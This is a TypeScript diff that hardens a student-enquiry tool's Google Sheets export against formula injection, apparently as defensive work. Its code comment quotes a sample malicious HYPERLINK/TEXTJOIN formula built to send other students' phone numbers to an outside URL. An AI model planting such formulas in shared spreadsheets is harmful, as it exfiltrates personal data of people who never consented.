@@ -319,12 +319,23 @@ function history(p: Person): string {
 
 const RAW = (v: unknown) => (v === null || v === undefined ? "" : String(v));
 
+/**
+ * A student-typed value, kept as text.
+ *
+ * Rows are written USER_ENTERED (our own HYPERLINK cells need it), so a value that
+ * starts with `=`, `+`, `-` or `@` would be stored as a live formula — an anonymous
+ * enquiry could plant `=HYPERLINK("https://…?d="&TEXTJOIN(…other students' phones…))`
+ * in the counsellors' sheet (found 2026-11-05). The leading apostrophe makes Sheets
+ * keep it as text and is not shown. Our own `=HYPERLINK(...)` cells never go through this.
+ */
+export const sheetText = (s: string): string => (/^[=+\-@\t\r\n]/.test(s) ? `'${s}` : s);
+
 function studentValues(p: Person, serial: number, seatUrl: string | null): Record<string, string | number> {
   const L = p.latest;
   const fmt = (key: string) => {
     const f = FIELDS.find((x) => x.key === key)!;
     const v = L[key];
-    return v === undefined ? "" : f.fmt ? f.fmt(v) : String(v);
+    return sheetText(v === undefined ? "" : f.fmt ? f.fmt(v) : String(v));
   };
   const digits = p.phone.replace(/\D/g, "");
   const filled = PROFILE_KEYS.filter((key) => L[key] !== undefined).length;
@@ -348,7 +359,7 @@ function studentValues(p: Person, serial: number, seatUrl: string | null): Recor
     gender: fmt("gender"),
     pwd: fmt("pwd"),
     city: fmt("city"),
-    guardian: fmt("guardian") ? `'${fmt("guardian")}` : "",
+    guardian: fmt("guardian") ? `'${fmt("guardian").replace(/^'/, "")}` : "",
     branches: fmt("branches"),
     states: fmt("states"),
     collegeTypes: fmt("collegeTypes"),
@@ -360,9 +371,9 @@ function studentValues(p: Person, serial: number, seatUrl: string | null): Recor
     internship: fmt("internship"),
     serviceQuota: fmt("serviceQuota"),
     bond: fmt("bond"),
-    source: sources.join(" · "),
+    source: sheetText(sources.join(" · ")),
     complete: `${Math.round((filled / PROFILE_KEYS.length) * 100)}%`,
-    history: history(p),
+    history: sheetText(history(p)),
     // The leading apostrophe keeps it text: entered as "+9193…", Sheets stores the
     // number 9193… and the row is never found again — which on 2026-10-16 wrote
     // every student once per run until it was caught.
@@ -883,7 +894,7 @@ async function writeToday(id: string, props: SheetProps, people: Person[]) {
     why,
     p.priority,
     TABS[p.tab],
-    String(p.latest.name ?? "Not given"),
+    sheetText(String(p.latest.name ?? "Not given")),
     `=HYPERLINK("tel:${p.phone}","${p.phone}")`,
     p.team.counsellor,
     p.team.status,
